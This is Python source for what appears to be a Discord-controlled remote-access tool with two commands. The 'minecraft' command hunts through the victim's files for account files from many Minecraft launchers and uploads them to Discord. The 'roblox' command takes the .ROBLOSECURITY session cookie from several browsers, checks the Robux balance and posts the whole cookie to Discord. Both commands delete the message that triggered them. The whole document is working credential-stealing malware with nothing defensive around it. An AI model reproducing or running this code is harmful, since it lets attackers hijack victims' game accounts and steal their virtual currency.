#<imports>
import requests
import os
import browser_cookie3
#</imports>

#<command>
@client.command(name='minecraft')
async def get_minecraft(ctx):
    await ctx.message.delete()
    userProfile = os.getenv("USERPROFILE")
    roaming = os.path.join(userProfile, "AppData", "Roaming")


    launcher_profiles_paths = os.path.join(roaming, ".minecraft", "launcher_profiles.json")


    minecraftPaths = {
        "Default Launcher Profiles": launcher_profiles_paths,
        "Intent": os.path.join(userProfile, "intentlauncher", "launcherconfig"),
        "Lunar": os.path.join(userProfile, ".lunarclient", "settings", "game", "accounts.json"),
        "TLauncher": os.path.join(roaming, ".minecraft", "TlauncherProfiles.json"),
        "Feather": os.path.join(roaming, ".feather", "accounts.json"),
        "Meteor": os.path.join(roaming, ".minecraft", "meteor-client", "accounts.nbt"),
        "Impact": os.path.join(roaming, ".minecraft", "Impact", "alts.json"),
        "Novoline": os.path.join(roaming, ".minecraft", "Novoline", "alts.novo"),
        "CheatBreakers": os.path.join(roaming, ".minecraft", "cheatbreaker_accounts.json"),
        "Microsoft Store": os.path.join(roaming, ".minecraft", "launcher_accounts_microsoft_store.json"),
        "Rise": os.path.join(roaming, ".minecraft", "Rise", "alts.txt"),
        "Rise (Intent)": os.path.join(userProfile, "intentlauncher", "Rise", "alts.txt"),
        "Paladium": os.path.join(roaming, "paladium-group", "accounts.json"),
        "PolyMC": os.path.join(roaming, "PolyMC", "accounts.json"),
        "Badlion": os.path.join(roaming, "Badlion Client", "accounts.json"),
    }

    found_files = False
    for launcher_name, path in minecraftPaths.items():
        if os.path.exists(path):
            await ctx.send(f"Found `{launcher_name}` launcher file:", file=discord.File(path))
            found_files = True

    if not found_files:
        await ctx.send(embed=discord.Embed(
            title="ðŸ“› Error",
            description="```No Minecraft launcher files detected!```",
            color=0xff0000
        ))

#start roblox


@client.command(name='roblox')
async def get_roblox(ctx):
    await ctx.message.delete()
    roblox_cookies = {}
    browsers = [
        ('Chrome', browser_cookie3.chrome),
        ('Edge', browser_cookie3.edge),
        ('Firefox', browser_cookie3.firefox),
        ('Safari', browser_cookie3.safari),
        ('Opera', browser_cookie3.opera),
        ('Brave', browser_cookie3.brave),
        ('Vivaldi', browser_cookie3.vivaldi)
    ]


    for browser_name, browser in browsers:
        try:
            browser_cookies = browser(domain_name='roblox.com')
            for cookie in browser_cookies:
                if cookie.name == '.ROBLOSECURITY':
                    roblox_cookies[browser_name] = cookie.value
        except Exception:
            pass

    if not roblox_cookies:

        await ctx.send(embed=discord.Embed(
            title="ðŸ“› Error",
            description="```No Roblox cookies found!```",
            color=0xff0000
        ))
        return


    roblox_cookie = next(iter(roblox_cookies.values()))
    headers = {"Cookie": ".ROBLOSECURITY=" + roblox_cookie}

    try:

        response = requests.get("https://users.roblox.com/v1/users/authenticated", headers=headers)
        response.raise_for_status()
        user_info = response.json()
        user_id = user_info.get("id")

        if user_id:

            user_details = requests.get(f"https://users.roblox.com/v1/users/{user_id}").json()


            robux_balance = 0
            try:
                robux_response = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/currency",
                                              headers=headers)
                robux_response.raise_for_status()
                robux_balance = robux_response.json().get("robux", 0)
            except Exception:
                robux_balance = "Error retrieving balance"


            avatar_url = ""
            try:
                avatar_response = requests.get(
                    f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=150x150&format=png")
                avatar_response.raise_for_status()
                avatar_data = avatar_response.json().get("data", [])
                if avatar_data:
                    avatar_url = avatar_data[0].get("imageUrl", "")
            except Exception:
                avatar_url = "Error retrieving avatar"


            first_half = roblox_cookie[:len(roblox_cookie) // 2]
            second_half = roblox_cookie[len(roblox_cookie) // 2:]


            embed = discord.Embed(
                title="Roblox User Info",
                color=0x00ff00  # Green color
            )
            embed.add_field(name="Username", value=f"`{user_details.get('name')}`", inline=True)
            embed.add_field(name="Display Name", value=f"`{user_details.get('displayName')}`", inline=True)
            embed.add_field(name="Robux", value=f"`{robux_balance}`", inline=True)
            embed.add_field(name="Cookie (Part 1)", value=f"`{first_half}`", inline=False)
            embed.add_field(name="Cookie (Part 2)", value=f"`{second_half}`", inline=False)
            embed.set_thumbnail(url=avatar_url)
            embed.set_footer(text="Roblox Info")


            await ctx.send(embed=embed)
        else:
            await ctx.send(embed=discord.Embed(
                title="ðŸ“› Error",
                description="```Could not authenticate user!```",
                color=0xff0000
            ))

    except Exception as e:
        await ctx.send(embed=discord.Embed(
            title="ðŸ“› Error",
            description="```Failed to retrieve Roblox info!```",
            color=0xff0000
        ))
#</command>







